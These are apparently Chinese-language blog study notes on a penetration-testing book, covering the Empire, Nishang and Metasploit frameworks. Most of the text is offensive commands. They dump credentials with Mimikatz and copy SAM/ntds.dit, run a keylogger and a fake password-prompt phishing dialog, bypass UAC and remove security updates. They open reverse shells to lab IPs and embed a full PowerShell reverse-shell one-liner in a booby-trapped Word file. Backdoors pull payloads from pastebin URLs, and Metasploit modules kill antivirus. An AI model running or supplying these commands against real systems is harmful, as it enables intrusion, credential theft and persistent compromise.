Empire</h2><p>Empire是一款针对Windows平台的、使用PowerShell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成、提权到渗透维持的一系列功能。Empire实现了无需powershell.exe就可运行PowerShell代理的功能，还可以快速在后期部署漏洞利用模块，其内置模块有键盘记录、Mimikatz、绕过UAC、内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于PowerShell的远程控制木马</p><p>Empire的功能可参考官方网站 <a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p><h3 id="3-1-Empire-的安装"><a href="#3-1-Empire-的安装" class="headerlink" title="3.1 Empire 的安装"></a>3.1 Empire 的安装</h3><p>Empire 运行在Linux平台上，首先使用git命令下载程序目录</p><p><code>git clone https://github.com/BC-SECURITY/Empire.git</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 进入下载的目录</span><br><span class="hljs-built_in">cd</span> Empire <br><span class="hljs-built_in">cd</span> setup<br><span class="hljs-comment"># 安装</span><br>sudo ./install.sh<br><span class="hljs-comment"># 安装完成后可以在Empire目录下输入./empire即可打开Empire</span><br>./empire<br></code></pre></div></td></tr></table></figure><p>界面如图</p><h3 id="3-2-设置监听"><a href="#3-2-设置监听" class="headerlink" title="3.2 设置监听"></a>3.2 设置监听</h3><p>运行Empire后，首先使用help查看使用帮助</p><p>Empire类似于Metasploit，同样是设置监听后生成木马，之后目标机运行木马后，我们的监听会连接反弹的代理</p><p>建立监听：输入listeners命令进入监听线程界面，输入help查看帮助文件</p><p>之后输入uselistener来设置采用的具体模式。双击Tab键可以看到一共有7种模式</p><p>这里采用http监听模式，输入<code>uselistener http</code> ,然后输入info命令查看具体参数设置使用set进行设置 <code>set name shuteer</code> <code>set host (empire所在的服务器IP)</code></p><p>设置后可输入info进行检查，之后输入execute命令即可开始监听，back返回上一层listeners界面，list命令可列出当前激活的listener，kill+name命令可以删除该监听</p><h3 id="3-3-生成木马"><a href="#3-3-生成木马" class="headerlink" title="3.3 生成木马"></a>3.3 生成木马</h3><p>可以将该部分理解为Metasploit里的Payload、Empire中输入usetstager来设置使用何种模块，同样双击Tab键可以看到具体的板块</p><p>以下是常用类型的木马</p><ol><li><p>DLL木马</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 设置类型</span><br>usestager windows/dll<br><span class="hljs-comment"># 查看设置 </span><br>info<br><span class="hljs-comment"># set listener sh</span><br></code></pre></div></td></tr></table></figure></li><li><p>未完待续(等安装成功后尝试)</p></li></ol><h2 id="4-Nishang"><a href="#4-Nishang" class="headerlink" title="4.Nishang"></a>4.Nishang</h2><p>Nishang是一款针对PowerShell的渗透工具。它基于PowerShell的渗透测试专用工具，集成了框架、脚本和各种Payload，包括了下载和执行、键盘记录、DNS、延时命令等脚本。下载地址为https: //github.com/samratashok/nishang</p><p>导入模块<code>Import-Module .\nishang.psm1</code></p><p>输入<code> Get-Command -Module nishang</code>可以查看具体的模块，内容部分如下</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813144245.jpg"></p><p>执行<code>get-information</code>将获取大量目标机器的信息，可以将结果导出到txt文件中，命令如下<code>Get-Information | Out-File D:\re.txt</code></p><p>Nishang模块说明</p><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>Antak-WebShell</td><td>WebShell</td></tr><tr><td>Backdoors</td><td>后门</td></tr><tr><td>Client</td><td>客户端</td></tr><tr><td>Escalation</td><td>提权</td></tr><tr><td>Execution</td><td>RCE</td></tr><tr><td>Gather</td><td>信息收集</td></tr><tr><td>Misc</td><td>杂项</td></tr><tr><td>Pivot</td><td>跳板/远程执行exe</td></tr><tr><td>Scan</td><td>扫描</td></tr><tr><td>powerpreter</td><td>Meterpreter会话</td></tr></tbody></table><h3 id="4-1-实战模块"><a href="#4-1-实战模块" class="headerlink" title="4.1 实战模块"></a>4.1 实战模块</h3><p>对于部分模块进行讲解</p><ol><li><p>Check-VM</p><p>对于目标机是否是虚拟机进行判断，方法是通过检测已知的虚拟机指纹进行判断<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813164935.png"></p></li><li><p>Invoke-CredentialsPhish</p><p>命令执行后效果如下<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813165945.png"></p><p>该脚本的功能很强大，因为不输入正确密码就关闭不了对话框，只能强制结束进程,这里成功得到明文的管理员账号密码<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813170124.png"></p></li><li><p>Copy-VSS</p><p>脚本利用Volume Shadow Copy服务复制sam文件，如果脚本运行在DC机上，ntds.dit和SYSTEM hive也能进行拷贝</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 直接保存在当前路径下</span><br><span class="hljs-built_in">Copy-VSS</span><br><span class="hljs-comment"># 指定位置</span><br><span class="hljs-built_in">Copy-VSS</span> <span class="hljs-literal">-DestinationDir</span> F:<br></code></pre></div></td></tr></table></figure></li><li><p>FireBuster FireListener扫描器</p><p>用于对内网进行扫描，打开本地监听，然后远程传送数据，把包发给FireListener</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 首先在本机运行FireListener</span><br>FireListener <span class="hljs-number">130</span><span class="hljs-literal">-150</span><br><span class="hljs-comment"># 目标机</span><br>FireBuster <span class="hljs-number">192.168</span>.<span class="hljs-number">66.66</span> <span class="hljs-number">130</span><span class="hljs-literal">-150</span> <span class="hljs-literal">-Verbose</span><br></code></pre></div></td></tr></table></figure></li><li><p>Keylogger</p><p>首先执行帮助命令进行查看<code> Get-Help .\Gather\Keylogger.ps1 -full</code><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210813171128.png"></p><p>对于上述中的第一方法进行讲述</p><p>第一种：使用这种方式运行,键盘记录会被保存在当前用户Temp目录下的key文件中</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 运行脚本</span><br>.\Gather\Keylogger.ps1<br><span class="hljs-comment"># 填写参数</span><br>CheckURL:  http://pastebin.com/raw.php?i=jqP2vJ3x <span class="hljs-comment"># 表示需要检查的网页url</span><br>MagicString: stopthis <span class="hljs-comment"># 检测url中是否包含字符，如果包含就停止记录</span><br><span class="hljs-comment"># 停不下来，，，，，，也不知道为啥</span><br><br><span class="hljs-comment"># 读取文件到当前目录下vh</span><br>Parse_Keys C:\Users\bsms\AppData\Local\Temp\key.log pass.txt<br></code></pre></div></td></tr></table></figure></li><li><p>Invoke-Mimikatz</p><p>参考命令</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># Dump出本机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-DumpCreds</span><br><span class="hljs-comment"># Dump出远程计算机的凭证信息</span><br><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-DumpCreds</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&quot;NAME&quot;</span>)<br><span class="hljs-comment"># 在远程计算机上运行Mimikatz并执行privilege: debug exit</span><br><span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;privilege: debug exit&quot;</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;Name&quot;</span><br></code></pre></div></td></tr></table></figure></li><li><p>Get-PassHashes</p><p>脚本在管理员权限下可Dump出密码哈希值</p><p>命令<code> Get-PassHashes</code></p><p>最后展示的结果是所有的用户都是同一个值？？？？？why</p></li><li><p>获取用户的密码提示信息</p><p>命令<code>Get-PassHints</code></p></li></ol><h3 id="4-2-PowerShell隐藏通信隧道"><a href="#4-2-PowerShell隐藏通信隧道" class="headerlink" title="4.2 PowerShell隐藏通信隧道"></a>4.2 PowerShell隐藏通信隧道</h3><ol><li><p>基于TCP协议的PowerShell交互式Shell</p><p>Invoke-PowerShellTcp可以是实现PowerShell的正向或反向连接Shell，具体参数</p><ul><li>IPAddress &lt;string&gt; ：选择-Reverse选项时表示需要连接的IP地址</li><li>Port&lt;int32&gt;：选择-Reverse选项时表示要连接的端口，选择-Bind选项表示要监听的端口</li><li>Reverse[&lt;SwitchParameter&gt;] ：反向连接</li><li>Bind [&lt;SwitchParameter&gt;]：正向连接</li></ul><ol><li><p>反向连接</p><p>使用NC监听本地6666端口（需要先监听再执行脚本）</p><p>命令<code>nc -lvp 6666</code></p><p>之后在目标机PowerShell执行以下命令</p><p><code> Invoke-PowerShellTcp -Reverse -IPAddress 192.168.66.66 -Port 6666</code><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814154242.png"></p></li><li><p>正向连接</p><p>在目标机PowerShell执行以下命令</p><p><code>Invoke-PowerShellTcp -Bind -Port 3333</code></p><p>在NC下执行以下命令，连接目标机的3333端口</p><p><code>nv -nv  192.168.66.66 3333</code></p><p>结果如图<img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814154945.png"></p></li></ol></li><li><p>基于UDP协议的PowerShell交互式Shell</p><p>Invoke-PowerShellUdp是基于Udp协议的PowerShell正向或反向连接</p><p>具体使用方法与TCP的类似，其中nc命令参考如下</p><p>正向连接：<code>nc -nvu 192.168.66.66 6666</code></p><p>反向连接：<code>nc -lup 6666</code></p><p><strong>知识点</strong>：查看windows和linux1的各种命令解析，推荐网址-<a href="https://www.explainshell.com/">https://www.explainshell.com/</a></p></li><li><p>基于HTTP和HTTPS协议的PowerShell交互式Shell</p><p>Invoke-PoshRatHttp和Invoke-PoshRatHttps是基于HTTP和HTTPS协议的PowerShell反向连接Shell，命令如下</p><p>HTTP:<code>Invoke-PoshRatHttp -IPAddress 192.168.66.132 -Port 6666</code></p><p>始终报错：Something went wrong! Check if client could reach the server and using the correct port.</p><p>HTTPS:<code>Invoke-PoshRatHttp -IPAddress 192.168.66.132 -Port 6666</code></p><p>之后是将生成的命令复制到目标机CMD中执行，成功后命令行会自动消失，然后在本机PowerShell下会返回目标机IP为192.168.12.107(即目标机)的会话。</p></li></ol><h3 id="4-3-WebShell后门"><a href="#4-3-WebShell后门" class="headerlink" title="4.3 WebShell后门"></a>4.3 WebShell后门</h3><p>模块只有一个ASPX的“大马”，可以使用该WebShell编码执行脚本，上传下载文件</p><h3 id="4-4-权限提升"><a href="#4-4-权限提升" class="headerlink" title="4.4 权限提升"></a>4.4 权限提升</h3><ol><li><p>下载执行</p><p>Download_Execute是Nishang中的下载执行脚本，用于下载文本文件，然后转化为可执行文件执行</p><p>利用Metasploit生成木马，再先利用ExetoText模块将exe文件转化为txt文件</p><p><code>ExetoText .\win.exe F:\win.txt</code></p><p>之后执行命令进行下载执行<code>Download_Execute http://127.0.0.1/win.txt</code>执行成功后能够在Metasploit监听端口获得反弹回来的Shell。</p></li><li><p>Bypass UAC</p><p> User Account Control(用户账户控制)会要求用户在执行可能会影响计算机运行或其他用户设置的操作之前，提供权限。通过在这些操作执行前对其进行验证，在未经许可的情况下，UAC可以防止恶意软件和间谍软件在计算机上进行安装或对计算机进行更改</p><p> 在Windows Vista以及更高的版本中，微软引进了安全控制策略，分为高、中、低三个等级。高等级的进程具有管理员权限，中等级进程拥有一个基本用户的权限，低级别进程的权限受各种限制，用来保证在系统受到威胁时，使损害保持在最小。<br> UAC需要授权的动作：</p><ul><li>配置Windows Update</li><li>增加或删除用户账户</li><li>改变用户的账户类型</li><li>改变UAC设置</li><li>安装ActiveX</li><li>安装或卸载程序</li><li>安装设备驱动程序</li><li>设置家长控制</li><li>将文件移动或复制到Program Files或Windows命令</li><li>查看其它用户的文件夹</li></ul><p> UAC有4种设置要求</p><ol><li>始终通知：最严格的设置，任何时候，当有程序要使用高级别权限时，都会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。本地<br> Windows程序要使用高级别权限时，不通知用户。但当第三方程序要求使用高级别权限时，会提示本地用户</li><li>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但提示用户时不降低桌面的亮度</li><li>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</li></ol><p> Invoke-PsUACme模块使用了UACME项目的DLL来绕过UAC，具体如下图</p><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814214055.png"></p><p> 具体执行方式</p> <figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 使用Sysprep方法并执行默认的Payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># 使用oobe方法并执行默认Payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment"># 使用默认方法执行指定Payload </span><br><span class="hljs-built_in">Invoke-PsUACme</span> <span class="hljs-literal">-Payload</span> <span class="hljs-string">&quot;命令&quot;</span><br><span class="hljs-comment"># 还可以利用PayloadPath参数指定Payload路径，还可使用-CustomDll64或-CustomDll32自定义一个DLL文件</span><br></code></pre></div></td></tr></table></figure></li><li><p>删除补丁</p><p> 使用Remove-Updata可以移除系统的更新</p> <figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># 移除机器上所有更新</span><br><span class="hljs-built_in">Remove-Update</span> All<br><span class="hljs-comment"># 移除机器上所有与安全相关更新</span><br><span class="hljs-built_in">Remove-Update</span> Security<br><span class="hljs-comment"># 利用systeminfo查看目标机的更新情况</span><br>systeminfo<br><span class="hljs-comment"># 移除指定编号的更新</span><br><span class="hljs-built_in">Remove-Update</span> KB***<br></code></pre></div></td></tr></table></figure></li><li><p>其他功能</p><ol><li><p>端口扫描(Invoke-PortScan)</p><p> 模块用于发现主机、解析主机、端口扫描</p><p> ` Invoke-PortScan [-StartAddress] <String> [-EndAddress] <String> [-ResolveHost] [-ScanPort] [-Ports &lt;Int32[]&gt;] [-Tim</p><div class="hljs code-wrapper"><pre><code> eOut &lt;Int32&gt;] [&lt;CommonParameters&gt;]`</code></pre></div><p> 部分参数介绍</p><ul><li>StartAddress：扫描范围开始的地址</li><li>EndAddress：扫描范围结束的地址</li><li>ScanPort：进行端口扫描</li><li>Port：指定扫描端口</li><li>TimeOut：设置超时时间</li></ul><p> 扫描存活主机并解析主机名<code> Invoke-PortScan -StartAddress 192.168.66.1 -EndAddress 192.168.66.255 -ResolveHos</code></p><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210814221033.png"></p></li><li><p>爆破破解(Invoke-BruteForce)</p><p> Invoke-BruteForce是Nishang中暴力破解的脚本，用于SQL Server、域控制器、Web、以及FTP弱口令爆破</p><p> <code>Invoke-BruteForce [-ComputerName] &lt;String&gt; [-UserList] &lt;String&gt; [-PasswordList] &lt;String&gt; [-Service] &lt;String&gt; [[-StopOnSuccess]] [[-Jitter] &lt;Double&gt;] [[-Delay] &lt;UInt32&gt;] [&lt;CommonParameters&gt;]</code></p><p> <img src="https://s3.bmp.ovh/imgs/2021/08/137f39ac8ae1ccd8.png"></p><p> 参数介绍</p><ul><li>ComputerName：对应服务的计算机名</li><li>UserList：用户名字典</li><li>PasswordList：密码字典</li><li>Service(默认为SQL)</li><li>StopOnSuccess：匹配一个后停止</li><li>Delay：延迟时间</li></ul></li><li><p>嗅探</p><p> 内网中嗅探方法简单，但是动静较大</p><p> 模块命令</p><p> ` Invoke-Interceptor [[-ListenPort] <Int32>] [[-ProxyServer] <String>] [[-ProxyPort] <Int32>] [[-Tamper]] [[-HostCA]] [[-AutoProxyConfig]] [[-Cleanup]] [[-SearchString] <String>] [[-ReplaceString] <String>]</p><div class="hljs code-wrapper"><pre><code>  [[-Domains] &lt;String&gt;] [[-LogFile] &lt;String&gt;] [&lt;CommonParameters&gt;]`</code></pre></div><p> 目标机执行以下命令<code>Invoke-Interceptor -ProxyServer 192.168.66.66 -ProxyPort 6666</code></p><p> 本机监听对应端口 <code>nc -lvvp 6666</code></p></li><li><p>屏幕窃取</p><p> Show-TargetScreen脚本使用MJPEG传输目标机远程桌面的实时画面,在本机可以使用NC或者PowerCat进行监听。在本地使用支持MJPEG的浏览器(如Firefox）访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面,正向反向均可。<br> 执行方式:</p><p> 将远程的画面传送到192.168.66.132的443端口</p><p> <code>Show-TargetScreen -Reverse -lPAddress 192.168.66.132 -Port 443</code><br> 具体参数如下</p><ul><li>IPAddress：后面加IP地址</li><li>Port：加端口</li><li>Bind：正向连接</li></ul><p> 反向连接窃取屏幕</p><p> 在本机输入命令之后访问对应端口即可窃取</p><p> <code>nc -nlvp 443|nc -nlvp 6666</code></p><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210815013904.png"></p></li><li><p>生成木马</p><p> 生成木马的脚本使用方法基本相同，这里以生成收污染的Word为例</p><p> 参数介绍</p><ul><li>Payload：后面加Payload</li><li>Payload：传入远程Payload进行生成</li><li>PayloadScript：指定本地的脚本生成</li><li>Arguments：之后要执行的函数（是Payload有的函数）</li><li>OutputFile：输出的文件名</li><li>WordFileDir：输出的目录地址</li><li>Recurse：在WordFileDir中递归寻找Word文件</li><li>RemoveDocx：创建完成后删除原始文件</li></ul><p> 首先监听本地端口</p><p> <code>nc -lvp 4666</code></p><p> 之后将nishang\shells\invoke-powershelltcponeline.ps1中的第三行文件修改远端地址，之后复制输入以下内容</p><p> <code> Invoke-Encode -DataToEncode &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;IP地址&#39;,6056);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot; -IsString -PostScript</code></p><p> 之后会在当前目录生成两个文件，一个是encoded.txt，另一个是encodedcommand.txt</p><p> 接着执行<code>Out-Word -PayloadScript .\encodedcommand.txt</code>后应该会有一个当前目录下的Salary_Details.doc文件，目标用户打开word之后会反弹Shell</p></li><li><p>后门</p><ol><li><p>HTTP-Backdoor</p><p> HTTP-Backdoor以在目标机器上下载和执行PowerShell脚本，接收来自第三方网站的指令，然后在内存中执行PowerShell脚本，其语法如下所示。<br> <code>HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL  http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis</code><br> 具体的参数介绍如下所示</p><ul><li>CheckURL：给出一个URL地址，如果存在，MagicString中的值就执行Payload来下载、运行我们的脚本</li><li>PayloadURL：给出需要下载的PowerShell脚本的地址</li><li>Arguments：指定要执行的函数</li><li>StopString：判断是否存在CheckURL返回的字符串，如果存在则停止执行</li></ul></li><li><p>Add-ScrnSaveBackdoor</p><p> 脚本利用windows的屏保来留下一个隐藏的后门，执行方式如下</p><p> <code>Add-ScrnSaveBackdoor -Payload &quot;shell.exe -命令&quot;</code></p><p> 使用msfvenom生成一个PowerShell，之后使用命令返回Meterpreter</p></li><li><p>Execute-OnTime</p><p> Execute-OnTime在目标机上指定PowerShell脚本的执行时间，与HTTP-Backdoor使用方式相似，执行方式如下</p><p> <code>Execute-Ontime -PayloadURL  http://pastebin.com/raw.php?i=Zhyf8rwh Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x  -MagicString start123 -StopString stopthis</code></p></li><li><p>Invoke-ADSBackdoor</p><p> 脚本使用NTFS数据流留下一个<strong>永久性</strong>的后门且不易被发现</p><p> 脚本向ADS中注入代码并且以普通用户的权限运行，输出以下命令即可执行脚本</p><p> <code>Invoke-ADSBackdoor -PayloadURL http://192.168.11.11/tmp.ps1</code></p><p> 使用命令dir /a /r才能看到被写入的文件</p></li></ol></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 Web安全攻防-渗透测试实战指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试实战指南-Metasploit技术</title>
    <link href="/2021/08/02/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-Metasploit%E6%8A%80%E6%9C%AF/"/>
    <url>/2021/08/02/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-Metasploit%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Metasploit技术"><a href="#Metasploit技术" class="headerlink" title="Metasploit技术"></a>Metasploit技术</h1><h1 id="1-Metasploit基础"><a href="#1-Metasploit基础" class="headerlink" title="1. Metasploit基础"></a>1. Metasploit基础</h1><p>Metasploit框架(Metasploit Framework，MSF)是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板</p><p>MSF框架由多个模块组成，各个模块如下</p><ol><li><p>Auxiliaries(辅助模块)</p><p>模块负责执行扫描、嗅探、指纹识别等相关功能进行辅助渗透测试</p></li><li><p>Exploit(漏洞利用模块)</p><p> 由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含针对系统漏洞设计的各种POC验证程序</p></li><li><p>Playload(攻击载荷模块)</p><p> 攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等</p></li><li><p>Post(后渗透模块)</p><p> 用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息，实施跳板攻击等</p></li><li><p> Encoders(编码工具模块)</p></li></ol><p>渗透攻击步骤</p><ul><li>扫描目标机系统，寻找可用漏洞</li><li>选择并配置一个漏洞利用模块</li><li>选择并配置一个攻击载荷模块</li><li>选择编码技术绕过杀毒软件的查杀</li><li>渗透攻击</li></ul><p>基本命令学习</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># use使用模块</span><br>use 模块<br><span class="hljs-comment"># show options 查看对应模块需要输入的参数等等</span><br>show options<br><span class="hljs-comment"># 设置或取消全局性的参数值</span><br>setg 命令<br>unsetg 命令<br></code></pre></div></td></tr></table></figure><h1 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2. 主机扫描"></a>2. 主机扫描</h1><figure class="highlight bat"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bat"># 端口扫描<br>search portscan<br># 扫描模块<br>search scanner<br></code></pre></div></td></tr></table></figure><p>利用搜索出来的辅助模块进行扫描</p><h1 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.  漏洞利用"></a>3.  漏洞利用</h1><p>根据目标服务器搜索对应的漏洞，之后进行漏洞的利用</p><h1 id="4-后渗透攻击"><a href="#4-后渗透攻击" class="headerlink" title="4. 后渗透攻击"></a>4. 后渗透攻击</h1><h2 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1 信息收集"></a>4.1 信息收集</h2><p>help查看帮助命令</p><p>获取shell之后需要将其和目标机中的一个稳定的进程绑定</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 获取正在运行的进程</span><br>ps<br><span class="hljs-comment"># 查看Meterpreter Shell的进程号</span><br>getpid<br><span class="hljs-comment"># 将shell移动到其它进程中，此处以Explorer.exe pid：448为例</span><br>migrate 448<br><span class="hljs-comment"># 此时使用getpid可以看到已经变为448，原进程应该是自动关闭，如果没有则使用</span><br><span class="hljs-built_in">kill</span> 原PID<br><span class="hljs-comment"># 也可使用自动迁移进程命令</span><br>run post/windows/manage/migrate<br></code></pre></div></td></tr></table></figure><p>收集系统信息</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看目标机的系统信息</span><br>sysinfo<br><span class="hljs-comment"># 查看是否运行在虚拟机上</span><br>run post/windows/gather/checkvm<br><span class="hljs-comment"># 查看目标机最近的运行时间</span><br>idletime<br><span class="hljs-comment"># 查看完整的网络设置</span><br>route<br><span class="hljs-comment"># background 将会话放到后台</span><br><span class="hljs-comment"># getuid 查看当前用户及权限</span><br><span class="hljs-comment"># 关闭目标机系统杀毒软件</span><br>run post/windows/manage/killav<br><span class="hljs-comment"># 启动远程桌面协议</span><br>run post/windows/manage/enable_rdp<br><span class="hljs-comment"># 查看目标机的本地子网情况</span><br>run post/windows/manage/autoroute<br></code></pre></div></td></tr></table></figure><p>此处按照书籍简述</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 首先使用background将终端隐藏在后台</span><br>background<br><span class="hljs-comment"># 添加路由</span><br>route add 192.168.66.0 255.255.255.0 1<br><span class="hljs-comment"># 查看路由</span><br>route <span class="hljs-built_in">print</span><br><span class="hljs-comment"># 列举当前多少用户登录目标机</span><br>run post/windows/gather/enum_logged_on_users<br><span class="hljs-comment"># 列举安装在目标机上的应用程序</span><br>run 